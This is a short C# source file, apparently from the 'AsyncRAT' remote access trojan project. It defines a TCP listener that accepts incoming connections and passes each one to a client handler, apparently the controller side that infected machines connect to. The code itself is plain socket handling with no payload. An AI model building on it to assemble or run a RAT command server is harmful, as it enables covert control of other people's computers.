using System.Threading.Tasks;
using System.Net;
using System.Net.Sockets;
using System;
using System.Threading;
using System.Windows.Forms;

namespace AsyncRAT_Sharp.Sockets
{
    class Listener
    {
        private Socket listener { get; set; }
        private static ManualResetEvent allDone = new ManualResetEvent(false);

        public void Connect(object port)
        {
            try
            {
                IPEndPoint IpEndPoint = new IPEndPoint(IPAddress.Any, Convert.ToInt32(port));
                listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)
                {
                SendBufferSize = 50 * 1024,
                ReceiveBufferSize = 50 * 1024,
                ReceiveTimeout = -1,
                SendTimeout = -1,
                };
                listener.Bind(IpEndPoint);
                listener.Listen(20);

                while (true)
                {
                    allDone.Reset();
                    listener.BeginAccept(EndAccept, null);
                    allDone.WaitOne();
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
                Environment.Exit(0);
            }
        }

        private void EndAccept(IAsyncResult ar)
        {
            try
            {
                Clients CL = new Clients(listener.EndAccept(ar));
            }
            catch { }

            finally { allDone.Set(); }
        }
    }
}
